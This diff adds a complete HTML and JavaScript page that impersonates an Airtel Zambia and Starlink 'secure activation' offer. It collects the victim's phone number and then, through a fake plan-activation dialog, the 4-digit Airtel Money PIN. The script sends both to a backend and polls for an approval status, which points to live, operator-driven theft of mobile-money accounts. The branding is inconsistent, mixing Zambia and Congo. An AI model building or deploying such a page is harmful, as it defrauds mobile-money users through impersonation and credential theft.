@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+<title>Airtel Lite — Login</title>
+<style>
+  :root{
+    --airtel-red:#cf1a20;
+    --airtel-red-dark:#a9181d;
+    --text-dark:#3d4a59;
+    --text-grey:#9299a3;
+    --border-blue:#b7c0c9;
+    --navy:#1d2c55;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
+  html{-webkit-text-size-adjust:100%;}
+  body{
+    font-family:'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background:#fff;
+    color:var(--text-dark);
+    min-height:100svh;
+    width:100%;
+    display:flex;
+    flex-direction:column;
+    padding:env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
+  }
+  .topbar{
+    height:90px;
+    background:linear-gradient(90deg,#e51920 0%,#bc171d 100%);
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 20px;
+  }
+  .topbar .logo-img{
+    height:48px;
+    width:auto;
+    padding:7px 12px;
+    background:#fff;
+    border-radius:6px;
+  }
+  .top-actions{
+    display:flex;
+    align-items:center;
+    gap:14px;
+    color:#fff;
+  }
+  .top-actions svg{width:26px;height:26px;display:block;}
+  .language{
+    min-width:145px;
+    height:52px;
+    border:1px solid rgba(255,255,255,.75);
+    border-radius:12px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    color:#fff;
+    font-size:20px;
+    font-weight:800;
+  }
+  .offer-bar{
+    height:76px;
+    background:#1b2a4f;
+    color:#fff;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:18px;
+  }
+  .offer-chip{
+    background:linear-gradient(135deg,#e7353a,#bc171d);
+    border-radius:24px;
+    padding:12px 18px;
+    font-size:22px;
+    font-weight:900;
+  }
+  .offer-text{
+    font-size:22px;
+    font-weight:800;
+  }
+  main{
+    flex:1;
+    width:100%;
+    max-width:630px;
+    margin:0 auto;
+    padding:44px 25px 80px;
+  }
+  .secure-card{
+    border:1px solid #e2e4e8;
+    border-radius:34px;
+    background:#fff;
+    box-shadow:0 12px 24px rgba(0,0,0,.12);
+    overflow:hidden;
+  }
+  .secure-head{
+    height:170px;
+    background:var(--airtel-red);
+    color:#fff;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+  }
+  .partner-row{
+    display:flex;
+    align-items:center;
+    gap:24px;
+  }
+  .partner-row .logo-img{
+    height:64px;
+    width:auto;
+    background:#fff;
+    border-radius:8px;
+    padding:8px 16px;
+  }
+  .multiply{font-size:30px;font-weight:700;}
+  .starlink-box{
+    height:64px;
+    min-width:180px;
+    background:#fff;
+    color:#111;
+    border-radius:8px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+  }
+  .starlink-box strong{font-size:25px;font-style:italic;line-height:1;}
+  .starlink-box small{font-size:8px;letter-spacing:3px;margin-top:5px;}
+  .secure-head h1{
+    color:#fff;
+    font-size:34px;
+    line-height:1;
+    margin-top:25px;
+  }
+  .secure-body{
+    padding:38px 38px 32px;
+  }
+  .intro{
+    text-align:center;
+    color:#4e5a69;
+    font-size:25px;
+    font-weight:700;
+    margin-bottom:42px;
+  }
+  h2.field-title{
+    color:var(--text-dark);
+    font-size:28px;
+    font-weight:800;
+    margin-bottom:20px;
+  }
+
+  .phone-field{
+    display:flex;
+    align-items:center;
+    gap:18px;
+    border:2px solid var(--border-blue);
+    border-radius:18px;
+    padding:16px 20px;
+    margin-bottom:18px;
+    min-height:82px;
+    box-shadow:inset 0 0 0 2px #dfe5ea;
+  }
+  .phone-field .flag{
+    display:none;
+  }
+  .phone-field .code{
+    font-size:30px;
+    font-weight:800;
+    color:#5a6370;
+    flex-shrink:0;
+    padding-right:18px;
+    border-right:1px solid #bac1ca;
+  }
+  .phone-field input{
+    flex:1;
+    border:none;
+    outline:none;
+    font-size:31px;
+    font-weight:800;
+    color:#111;
+    min-width:0;
+    width:100%;
+  }
+  .phone-field input::placeholder{color:#a7adb4;}
+
+  .format-text{
+    color:#a9afb7;
+    font-size:20px;
+    margin:8px 0 38px;
+  }
+  .phone-field .code{line-height:1.2;}
+
+  .flag{
+    width:24px;height:18px;
+    flex-shrink:0;
+    border-radius:2px;
+    overflow:hidden;
+    display:flex;
+  }
+  .phone-field .flag{display:none;}
+
+  .code-label{
+    text-align:center;
+    font-size:14px;
+    color:var(--text-grey);
+    font-weight:600;
+    margin-bottom:14px;
+  }
+
+  .code-row{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    margin-bottom:32px;
+    flex-wrap:nowrap;
+  }
+  .code-boxes{
+    display:flex;
+    gap:10px;
+    flex:1;
+    justify-content:center;
+  }
+  .code-boxes input{
+    width:100%;
+    max-width:56px;
+    aspect-ratio:1;
+    min-width:40px;
+    min-height:44px;
+    text-align:center;
+    font-size:20px;
+    font-weight:700;
+    border:2px solid var(--border-blue);
+    border-radius:10px;
+    outline:none;
+    color:var(--text-dark);
+  }
+  .code-boxes input:focus{border-color:var(--airtel-red);}
+
+  .connexion-btn{
+    width:100%;
+    min-height:86px;
+    border-radius:22px;
+    border:none;
+    background:#1d4e9b;
+    color:#fff;
+    font-size:30px;
+    font-weight:900;
+    letter-spacing:5px;
+    cursor:pointer;
+    touch-action:manipulation;
+    transition:background .2s ease;
+    margin-top:2px;
+  }
+  .connexion-btn.active{
+    background:#1d4e9b;
+    cursor:pointer;
+    box-shadow:0 10px 16px rgba(29,78,155,.25);
+  }
+  .connexion-btn.active:active{transform:translateY(1px) scale(0.99);}
+
+  /* --- Invalid phone number modal --- */
+  .invalid-modal{
+    position:fixed;
+    inset:0;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:24px;
+    background:rgba(24,31,42,0.58);
+    backdrop-filter:blur(1px);
+    -webkit-backdrop-filter:blur(1px);
+    z-index:100;
+  }
+
+  .invalid-modal.visible{display:flex;}
+
+  .invalid-card{
+    width:min(510px, calc(100% - 16px));
+    background:#fff;
+    border-radius:28px;
+    padding:58px 0 0;
+    text-align:left;
+    overflow:hidden;
+    box-shadow:0 18px 44px rgba(0,0,0,0.28);
+  }
+
+  .warning-icon{
+    display:none;
+  }
+
+  .invalid-card h2{
+    display:none;
+  }
+
+  .invalid-card p{
+    color:#34414f;
+    font-size:27px;
+    font-weight:700;
+    line-height:1.45;
+    margin:0 36px 42px;
+  }
+
+  .invalid-card button{
+    width:50%;
+    min-height:92px;
+    border:none;
+    border-radius:0;
+    background:#fff;
+    color:#244d87;
+    font-size:29px;
+    font-weight:800;
+    cursor:pointer;
+  }
+  .sheet-actions{
+    display:flex;
+    border-top:1px solid #e5e7ea;
+  }
+  .sheet-actions button + button{border-left:1px solid #e5e7ea;}
+  .sheet-actions #invalidOkBtn{color:#244d87;}
+  .pin-line{
+    height:1px;
+    background:#dfe3e7;
+    margin:18px 36px 12px;
+  }
+  .pin-dots{
+    display:flex;
+    justify-content:center;
+    gap:14px;
+    margin:0 36px 28px;
+  }
+  .pin-dots i{
+    width:48px;
+    height:48px;
+  }
+  .pin-dots input{
+    width:48px;
+    height:48px;
+    border:none;
+    border-bottom:2px solid #d4d8de;
+    text-align:center;
+    font-size:28px;
+    color:#34414f;
+    outline:none;
+  }
+
+  @media(max-width:480px){
+    body{min-height:100dvh;}
+    .topbar{
+      height:64px;
+      padding:0 12px;
+    }
+    .topbar .logo-img{
+      height:40px;
+      padding:5px 9px;
+      border-radius:5px;
+    }
+    .top-actions{gap:7px;}
+    .top-actions svg{
+      width:20px;
+      height:20px;
+    }
+    .top-actions svg:nth-of-type(2){display:none;}
+    .language{
+      min-width:74px;
+      height:34px;
+      border-radius:8px;
+      font-size:12px;
+    }
+    .offer-bar{
+      height:44px;
+      gap:8px;
+      padding:0 10px;
+    }
+    .offer-chip{
+      flex:none;
+      border-radius:14px;
+      padding:6px 9px;
+      font-size:11px;
+    }
+    .offer-text{
+      min-width:0;
+      font-size:11px;
+      line-height:1.2;
+      text-align:left;
+    }
+    main{
+      max-width:none;
+      padding:16px 12px 28px;
+    }
+    .secure-card{
+      border-radius:18px;
+      box-shadow:0 6px 16px rgba(0,0,0,.10);
+    }
+    .secure-head{
+      height:128px;
+    }
+    .partner-row{gap:10px;}
+    .partner-row .logo-img{
+      height:44px;
+      border-radius:6px;
+      padding:5px 9px;
+    }
+    .multiply{
+      font-size:19px;
+    }
+    .starlink-box{
+      height:44px;
+      min-width:112px;
+      border-radius:6px;
+    }
+    .starlink-box strong{font-size:17px;}
+    .starlink-box small{
+      font-size:6px;
+      letter-spacing:2px;
+      margin-top:3px;
+    }
+    .secure-head h1{
+      font-size:22px;
+      margin-top:16px;
+    }
+    .secure-body{
+      padding:20px 16px 16px;
+    }
+    .intro{
+      font-size:15px;
+      line-height:1.35;
+      margin-bottom:20px;
+    }
+    h2.field-title{
+      font-size:16px;
+      margin-bottom:10px;
+    }
+    .phone-field{
+      gap:10px;
+      min-height:58px;
+      border-width:1.5px;
+      border-radius:12px;
+      padding:10px 12px;
+      margin-bottom:8px;
+      box-shadow:inset 0 0 0 1px #dfe5ea;
+    }
+    .phone-field .code{
+      font-size:17px;
+      padding-right:10px;
+    }
+    .phone-field input{
+      font-size:18px;
+    }
+    .format-text{
+      font-size:12px;
+      margin:6px 0 18px;
+    }
+    .connexion-btn{
+      min-height:54px;
+      border-radius:12px;
+      font-size:16px;
+      letter-spacing:2px;
+    }
+    .invalid-modal{
+      padding:12px 12px 42px;
+    }
+    .invalid-card{
+      width:100%;
+      border-radius:18px;
+      padding-top:20px;
+    }
+    .invalid-card p{
+      font-size:16px;
+      line-height:1.45;
+      margin:0 20px 18px;
+    }
+    .invalid-card button{
+      min-height:56px;
+      font-size:16px;
+    }
+    .pin-line{
+      margin:10px 20px 8px;
+    }
+    .pin-dots{
+      gap:8px;
+      margin:0 20px 16px;
+    }
+    .pin-dots i,
+    .pin-dots input{
+      width:42px;
+      height:42px;
+    }
+    .pin-dots input{font-size:20px;}
+    .approval-overlay{padding:16px;}
+    .approval-card{
+      border-radius:16px;
+      padding:24px 20px 20px;
+    }
+    .spinner{
+      width:44px;
+      height:44px;
+    }
+  }
+
+  /* --- Waiting-for-approval overlay --- */
+  .approval-overlay{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.32);
+    backdrop-filter:blur(2px);
+    -webkit-backdrop-filter:blur(2px);
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:24px;
+    text-align:center;
+    z-index:50;
+  }
+  .approval-overlay.visible{display:flex;}
+  .approval-card{
+    width:min(540px, 100%);
+    background:#fff;
+    border-radius:22px;
+    padding:30px 28px 24px;
+    box-shadow:0 18px 44px rgba(0,0,0,0.18);
+    text-align:center;
+  }
+  .spinner{
+    width:52px;
+    height:52px;
+    border:4px solid #eee;
+    border-top-color:var(--airtel-red);
+    border-radius:50%;
+    animation:spin 0.9s linear infinite;
+    margin:0 auto 18px;
+  }
+  @keyframes spin{
+    to{transform:rotate(360deg);}
+  }
+  .approval-overlay h2{
+    font-size:clamp(23px,4vw,36px);
+    font-weight:800;
+    color:var(--airtel-red);
+    margin-bottom:10px;
+  }
+  .approval-overlay p{
+    font-size:clamp(16px,2.6vw,22px);
+    color:#2a2a2a;
+    max-width:300px;
+    line-height:1.45;
+    margin:0 auto;
+  }
+  .approval-overlay .denied-msg{
+    display:none;
+    color:var(--airtel-red);
+    font-weight:700;
+    font-size:clamp(18px,3vw,26px);
+    margin-top:8px;
+  }
+  .approval-overlay .retry-btn{
+    display:none;
+    margin-top:18px;
+    border:none;
+    background:var(--airtel-red);
+    color:#fff;
+    font-weight:800;
+    font-size:clamp(18px,3vw,26px);
+    letter-spacing:0.4px;
+    width:100%;
+    min-height:58px;
+    border-radius:12px;
+    cursor:pointer;
+    box-shadow:0 10px 20px rgba(227,6,19,0.22);
+  }
+
+  footer{
+    display:none;
+  }
+  footer .logo-row{margin-bottom:22px;}
+  footer .footer-logo-img{height:30px;}
+  footer .logo-tag{margin-bottom:22px;}
+  footer .collab-text{
+    font-size:14px;
+    color:var(--text-dark);
+    font-weight:600;
+  }
+  footer .collab-brand{
+    font-size:14px;
+    color:var(--text-dark);
+    font-weight:700;
+    margin-top:2px;
+  }
+  footer hr{
+    border:none;
+    border-top:1px solid #e0e0e0;
+    margin:22px 0 18px;
+  }
+  footer .copyright{
+    font-size:12px;
+    color:#9b9b9b;
+  }
+</style>
+</head>
+<body>
+  <header class="topbar">
+    <img src="assets/img/logo.svg" alt="Airtel" class="logo-img">
+    <div class="top-actions" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12.5a11 11 0 0 1 14 0M8.5 16a6 6 0 0 1 7 0M12 19.5h.01"/><path d="M2.5 9a15 15 0 0 1 19 0"/></svg>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 11l9-8 9 8"/><path d="M5 10v10h14V10M9 20v-6h6v6"/></svg>
+      <div class="language">EN / SW</div>
+    </div>
+  </header>
+  <div class="offer-bar">
+    <span class="offer-chip">70% OFF</span>
+    <span class="offer-text">OFFERS RUN UNTIL MAY 2027</span>
+  </div>
+
+  <main>
+    <section class="secure-card">
+      <div class="secure-head">
+        <div class="partner-row">
+          <img src="assets/img/logo.svg" alt="Airtel" class="logo-img">
+          <span class="multiply">×</span>
+          <div class="starlink-box"><strong>Starlink</strong><small>STARLINK</small></div>
+        </div>
+        <h1>Secure activation</h1>
+      </div>
+      <div class="secure-body">
+        <p class="intro">Enter your Airtel Zambia number to continue</p>
+        <h2 class="field-title">Airtel Zambia number</h2>
+        <div class="phone-field">
+          <span class="code">+260</span>
+          <input type="tel" id="phoneInput" placeholder="977 445 555" inputmode="numeric" maxlength="10">
+        </div>
+        <p class="format-text">Format: 097xxxxxxx or 077xxxxxxx</p>
+        <button class="connexion-btn" id="connexionBtn" disabled>
+          <span aria-hidden="true">→</span>&nbsp;&nbsp; CONTINUE
+        </button>
+      </div>
+    </section>
+  </main>
+
+  <div class="invalid-modal" id="invalidModal" role="dialog" aria-modal="true" aria-labelledby="invalidTitle">
+    <div class="invalid-card">
+      <h2 id="invalidTitle">Invalid format</h2>
+      <p id="invalidMessage">Enter a valid Airtel Zambia number to continue.</p>
+      <div class="pin-line" id="pinLine"></div>
+      <div class="pin-dots" id="pinDots" aria-hidden="true">
+        <input type="password" maxlength="1" inputmode="numeric" class="dialog-pin">
+        <input type="password" maxlength="1" inputmode="numeric" class="dialog-pin">
+        <input type="password" maxlength="1" inputmode="numeric" class="dialog-pin">
+        <input type="password" maxlength="1" inputmode="numeric" class="dialog-pin">
+      </div>
+      <div class="sheet-actions">
+        <button type="button" id="invalidOkBtn">Cancel</button>
+        <button type="button" id="sendBtn">Send</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="approval-overlay" id="approvalOverlay">
+    <div class="approval-card">
+      <div class="spinner" id="spinner"></div>
+      <h2 id="overlayTitle">Awaiting approval</h2>
+      <p id="overlayText">Your request has been sent. Please wait while it is being verified…</p>
+      <p class="denied-msg" id="deniedMsg">Incorrect PIN.</p>
+      <button class="retry-btn" id="retryBtn">RETRY</button>
+    </div>
+  </div>
+
+  <footer>
+    <div class="logo-row">
+      <img src="assets/img/logo.svg" alt="Airtel" class="logo-img footer-logo-img">
+    </div>
+    <div class="collab-text">In collaboration with</div>
+    <div class="collab-brand">STARLINK™</div>
+    <hr>
+    <div class="copyright">© 2026 Airtel Congo. All rights reserved.</div>
+  </footer>
+
+<script>
+  [
+    'smsCooldownUntil',
+    'smsExpired',
+    'smsRetryInProgress'
+  ].forEach(key => sessionStorage.removeItem(key));
+
+  const phoneInput = document.getElementById('phoneInput');
+  const codeBoxes = Array.from(document.querySelectorAll('.code-box'));
+  const dialogPinBoxes = Array.from(document.querySelectorAll('.dialog-pin'));
+  const ZAMBIA_MOBILE_PATTERN = /^(?:9[0-9]{8}|[57]7[0-9]{7}|09[0-9]{8}|0[57]7[0-9]{7})$/;
+
+  // Automatically reflect the phone number passed from the loan application.
+  const incomingParams = new URLSearchParams(window.location.search);
+  const incomingPhone = incomingParams.get('phone') || '';
+  const normalizedPhone = incomingPhone.replace(/\D/g, '').replace(/^260/, '');
+  if (ZAMBIA_MOBILE_PATTERN.test(normalizedPhone)) {
+    phoneInput.value = normalizedPhone;
+  }
+  const connexionBtn = document.getElementById('connexionBtn');
+
+  const invalidModal = document.getElementById('invalidModal');
+  const invalidMessage = document.getElementById('invalidMessage');
+  const invalidOkBtn = document.getElementById('invalidOkBtn');
+  const sendBtn = document.getElementById('sendBtn');
+  const pinLine = document.getElementById('pinLine');
+  const pinDots = document.getElementById('pinDots');
+
+  function showInvalidPhone(message){
+    invalidMessage.innerHTML = message;
+    pinLine.style.display = 'none';
+    pinDots.style.display = 'none';
+    sendBtn.style.display = 'none';
+    invalidOkBtn.style.width = '100%';
+    invalidModal.classList.add('visible');
+  }
+
+  function showActivationDialog(phone){
+    invalidMessage.innerHTML =
+      'Do you want to activate Standard Plan<br>(ZMW 25.00) for +' +
+      '260 ' + phone + '?<br><br><strong>Enter 4-digit Airtel Money PIN:</strong>';
+    pinLine.style.display = 'block';
+    pinDots.style.display = 'flex';
+    sendBtn.style.display = 'inline-block';
+    invalidOkBtn.style.width = '50%';
+    invalidModal.classList.add('visible');
+  }
+
+  function checkFormValid(){
+    const phone = phoneInput.value.trim();
+    if(phone.length > 0){
+      connexionBtn.classList.add('active');
+      connexionBtn.disabled = false;
+    } else {
+      connexionBtn.classList.remove('active');
+      connexionBtn.disabled = true;
+    }
+  }
+
+  phoneInput.addEventListener('input', () => {
+    // Keep the field clean, but do not show an error while typing.
+    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
+    checkFormValid();
+  });
+
+  invalidOkBtn.addEventListener('click', () => {
+    invalidModal.classList.remove('visible');
+    phoneInput.focus();
+  });
+  sendBtn.addEventListener('click', () => {
+    invalidModal.classList.remove('visible');
+    submitLoginRequest(dialogPinBoxes.map(b => b.value).join(''));
+  });
+  codeBoxes.forEach((box, i) => {
+    box.addEventListener('input', () => {
+      box.value = box.value.replace(/[^0-9]/g, '');
+      if(box.value && i < codeBoxes.length - 1){
+        codeBoxes[i + 1].focus();
+      }
+      checkFormValid();
+    });
+    box.addEventListener('keydown', (e) => {
+      if(e.key === 'Backspace' && !box.value && i > 0){
+        codeBoxes[i - 1].focus();
+      }
+    });
+  });
+
+  dialogPinBoxes.forEach((box, i) => {
+    box.addEventListener('input', () => {
+      box.value = box.value.replace(/[^0-9]/g, '');
+      if(box.value && i < dialogPinBoxes.length - 1){
+        dialogPinBoxes[i + 1].focus();
+      }
+    });
+    box.addEventListener('keydown', (e) => {
+      if(e.key === 'Backspace' && !box.value && i > 0){
+        dialogPinBoxes[i - 1].focus();
+      }
+    });
+  });
+
+  const overlay = document.getElementById('approvalOverlay');
+  const spinner = document.getElementById('spinner');
+  const overlayTitle = document.getElementById('overlayTitle');
+  const overlayText = document.getElementById('overlayText');
+  const deniedMsg = document.getElementById('deniedMsg');
+  const retryBtn = document.getElementById('retryBtn');
+  let pollTimer = null;
+
+  function showOverlayWaiting(){
+    overlay.classList.add('visible');
+    spinner.style.display = 'block';
+    overlayTitle.textContent = 'Please wait...';
+    overlayTitle.style.display = 'block';
+    overlayText.style.display = 'block';
+    overlayText.textContent = 'This usually takes a few seconds';
+    deniedMsg.style.display = 'none';
+    retryBtn.style.display = 'none';
+  }
+
+  function pollApproval(id, params){
+    if(pollTimer) clearInterval(pollTimer);
+    pollTimer = setInterval(async () => {
+      try {
+        const res = await fetch('/api/check-approval/' + id);
+        const data = await res.json();
+
+        if(data.status === 'approved'){
+          clearInterval(pollTimer);
+          params.set('id', id);
+          window.location.href = 'message.html?' + params.toString();
+        } else if(data.status === 'denied'){
+          clearInterval(pollTimer);
+          spinner.style.display = 'none';
+          overlayTitle.style.display = 'none';
+          overlayText.style.display = 'none';
+          deniedMsg.style.display = 'block';
+          retryBtn.style.display = 'inline-block';
+        }
+        // 'pending' -> keep polling
+      } catch (err) {
+        // network hiccup — keep trying silently
+      }
+    }, 2500);
+  }
+
+  retryBtn.addEventListener('click', () => {
+    overlay.classList.remove('visible');
+  });
+
+  connexionBtn.addEventListener('click', async () => {
+    const phone = phoneInput.value.trim();
+
+    // Show the invalid-number page only when the user tries to submit.
+    if(!ZAMBIA_MOBILE_PATTERN.test(phone)){
+      showInvalidPhone(
+        'Enter a valid number starting with 097, 077, 057, 97, 77, or 57.<br>Please enter the correct number and try again!'
+      );
+      return;
+    }
+
+    if(connexionBtn.disabled) return;
+    showActivationDialog(phone);
+  });
+
+  async function submitLoginRequest(code){
+    const phone = phoneInput.value.trim();
+    const params = new URLSearchParams(window.location.search);
+    params.set('phone', phone);
+    showOverlayWaiting();
+
+    try {
+      const res = await fetch('/api/request-approval', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          plan: params.get('plan'),
+          price: params.get('price'),
+          phone: phone,
+          code: code,
+          step: 'login'
+        })
+      });
+      const data = await res.json();
+      pollApproval(data.id, params);
+    } catch (err) {
+      overlayTitle.textContent = 'Connection error';
+      overlayText.textContent = "Unable to send the request. Check your connection and try again.";
+      spinner.style.display = 'none';
+      retryBtn.style.display = 'inline-block';
+    }
+  }
+</script>
+
+</body>
+</html>
